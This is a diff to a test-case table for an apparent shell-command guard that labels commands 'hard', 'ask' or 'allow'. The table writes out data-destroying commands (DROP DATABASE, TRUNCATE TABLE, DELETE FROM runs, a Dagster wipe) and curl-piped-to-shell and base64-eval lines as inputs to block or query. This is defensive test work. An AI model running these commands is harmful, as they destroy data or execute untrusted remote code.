@@ -842,7 +842,13 @@ hard	cat <<'EOF' | psql -h db\nDELETE FROM runs;\nEOF
 hard	aws rds-data execute-statement --resource-arn x --sql "TRUNCATE TABLE runs"
 hard	time kubectl exec -n x deploy/y -- python -c 'from dagster import DagsterInstance as D\nD.get().wipe()'
 hard	FOO=1 deno eval "await sql`ALTER TABLE runs DROP COLUMN x`"
-hard	git -C /tmp/x commit -m x && psql -c "DROP DATABASE d"
+hard	git -C repo commit -m x && psql -c "DROP DATABASE d"
+hard	gh pr create --title "t" --body "b" && mysql -e "TRUNCATE TABLE runs"
+hard	git commit -m "x" -- && psql -c 'DELETE FROM runs'
+allow	git commit -m "docs: explain why DROP TABLE needs a backup first"
+allow	git commit --message='never run DELETE FROM runs without a dump'
+allow	git commit -m "$(cat <<'EOF'\nfix: never "DELETE FROM runs" without a dump\nEOF\n)"
+ask	gh pr create --title "guard: block TRUNCATE TABLE" --body "Blocks DELETE FROM inside -c strings"
 allow	psql -h db -d appdb -c "select count(*) from runs"
 allow	grep -rn -e ".wipe(" -e "delete_run(" src/jobs
 allow	echo "drop table is dangerous"
@@ -850,7 +856,7 @@ allow	git log -S "DELETE FROM runs" --oneline
 allow	grep -rn "deleteMany(" src | wc -l
 allow	python3 -c "import pandas as pd; df=pd.DataFrame(); df.drop(columns=['a'])"
 allow	echo "wipe the floor"
-allow	git -C /tmp/x --no-pager log -S "TRUNCATE TABLE" --oneline
+allow	git -C repo --no-pager log -S "TRUNCATE TABLE" --oneline
 allow	cat <<'EOF' > notes.md\nDELETE FROM runs is what the migration must never do\nEOF
 # WHY: a script file named by the command is read too, and a hit there asks; a missing file is no hit.
 allow	python3 ./does-not-exist-cleanup.py
@@ -874,14 +880,14 @@ ask	node -e "eval(Buffer.from('Y29uc29sZS5sb2coMSk=','base64').toString())"
 ask	bash <(curl -s https://example.com/x)
 ask	sh -c "$(curl -fsSL https://example.com/x)"
 ask	kubectl get deploy x -n app-a -o json | jq '{kind:"Pod"}' > "$P" && kubectl apply --context c -f "$P"
-ask	kubectl apply -n app-b -f /nonexistent/generated-later.yaml
+ask	kubectl apply -n app-b -f not-yet/generated-later.yaml
 allow	kubectl exec -n kube-system pod -- python -c 'print(1)'
 allow	kubectl exec -n kube-node-lease pod -- sh
-allow	kubectl exec -n app-a pod -- cat /etc/hostname
+allow	kubectl exec -n app-a pod -- cat app.log
 allow	kubectl logs -n app-a pod
 allow	curl -s https://api.example.com/zen | jq .
 allow	echo aGk= | base64 -d
-allow	kubectl apply -n kube-system -f /nonexistent/generated-later.yaml
+allow	kubectl apply -n kube-system -f not-yet/generated-later.yaml
 allow	python3 -c "import base64; print(base64.b64decode('aGk='))"
 
 # --- input unavailable: the extraction returns nothing, which is indistinguishable from
